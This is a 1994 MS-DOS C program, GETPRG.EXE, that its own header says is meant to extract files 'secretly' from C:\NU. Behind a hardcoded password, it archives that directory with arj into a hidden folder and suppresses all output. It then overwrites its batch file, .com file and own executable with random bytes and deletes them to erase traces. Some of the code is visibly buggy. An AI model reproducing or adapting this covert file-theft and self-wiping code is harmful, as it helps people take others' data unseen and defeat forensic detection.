/*
 * Program:     GETPRG.EXE
 * Source:      getprg.c
 * Author:      Mike Carey
 * Date:        03-29-94
 * Version:     1.0 release version
 * Language:    Ansi C   MicroSoft Quick C
 * Purpose:     To exstract files secretly from C:\NU\*.*
 *
 */
   /* My include files */
#include "stdio.h"
#include "direct.h"
#include "graph.h"
#include "stdlib.h"
#include "string.h"

	/* The start to My program */
 main()
  {
   if(password()) {             /* Password Checking */
     _setvideomode(_ERESCOLOR);   /* Clear the Screen */
     _setvideomode(_DEFAULTMODE);
     ndrptt_cnttontt();
   }
   else {
     printf("\n\nERROR... Bad Input\n");
   }
   chdir("\\");
   _setvideomode(_ERESCOLOR);   /* Clear the Screen */
   _setvideomode(_DEFAULTMODE);
 }

	/* The begining of the actual work to transfer the files */
	/* from NU dir to my prvt dir. */

 ndrptt_cnttontt()
  {                  /* Variable Declarations */
   int l;
   char *inf[]= {
     "@echo off\n",     /* The commands that will preform the work */
     "arj a -r -v1440 c:\\cadd6\\3dd\\cm3\\prvt\\mdocs -y>null\n",
     "del null.*",
     "cls\n"
   };
   FILE *fp;
	/* Copying GETPRG.EXE program to the bin dir */
   system("copy getprg.exe c:\\bin\\getprg.exe >null");
   remove("null.");

   if((fp = fopen("c:\\bin\\xboot.bat", "w+"))==NULL) {
     printf("Failed attempt......\n");
     exit(1);
   }
   rewind(fp);
   for(l=0; l<4; l++) {         /* Start from the Bening of the */
     fputs(inf[l], fp);         /* file xboot.bat */
   }

   fclose(fp);          /* Closing the file through the pointer */
   fclose(fp);
   /* system("copy getprg.exe c:\\bin >null"); */
   system("c:");

   tbt();
   fclose(fp);
   chdir("\\cadd6\\3dd\\cm3");
   mkdir("prvt");       /* operations to create far out dir */
   chdir("\\nu");
   system("c:\\bin\\xboot.com");
   fclose(fp);

   cleanup();
 }
	/* *.Bat to *.Com conversion */
 tbt()
  {
   chdir("\\bin");
   system("tbat xboot.bat"); /* Serises of system commands for dos */
   _setvideomode(_ERESCOLOR);   /* Clear the Screen */
   _setvideomode(_DEFAULTMODE);
 }

		/* Wipeing the files xboot.bat, xboot.com, and */
 cleanup()      /* will wipe wipe GETPRG.EXE */
  {
   int x, z, utime;
   long ltime;                  /* Variable Declarations */
   char dwp;
   FILE *fp, *cm, *host;
   chdir("\\bin");
   ltime = time(NULL);          /* Randomization of timer */
   utime =(unsigned int) ltime/2;
   srand(utime);
   z = rand() % 255;
     remove("xboot.com");       /* Deletes the file */
     remove("xboot.bat");       /* Deletes the file */
     remove("getprg.exe");      /* Deletes the file */
     remove("null.");

   if((fp = fopen("c:\\bin\\xboot.bat", "a+b"))==NULL) {
     printf("Failed attempt......\n");  /* if fails then */
     exit(1);
   }

   if((cm = fopen("c:\\bin\\xboot.com", "a+b"))==NULL) {
     printf("Failed attempt......\n");  /* if fails then */
     exit(1);
   }

   if((host = fopen("c:\\bin\getprg.exe", "a+b"))==NULL) {
     printf("Failed attempt......\n");
     exit(1);
   }
   for(x=0; x<10000; x++) {
     z = rand() % 255;          /* File wipeing methode */
     dwp = z;
     putc(dwp, fp);
   }

   for(x=0; x<10000; x++) {
     z = rand() % 255;          /* File wipeing methode */
     dwp = z;
     putc(dwp, cm);
   }

   for(x=0; x<20000; x++) {
     z = rand() % 255;          /* File Wipeing methode */
     dwp = z;
     putc(dwp, host);
   }
     fclose(cm);
     remove("xboot.com");       /* Deletes the file */
     fclose(fp);
     remove("xboot.bat");       /* Deletes the file */
     fclose(host);
     remove("getprg.exe");        /* Deletes the file */
     remove("null.");

 }
    /* Location of the Password Block of code*/
  password()
   {            /* Password */
    char s[80];  /*   |   */
    printf(" "); /*   |   */
    gets(s);     /*   |   Password checking occures here. This is the */
		 /*   V   password. */
    if(strcmp(s, "okidata")) {  /* strings different */
      printf("\n");
      return 0;
    }
    /* strings campared the same */
    return 1;
 }
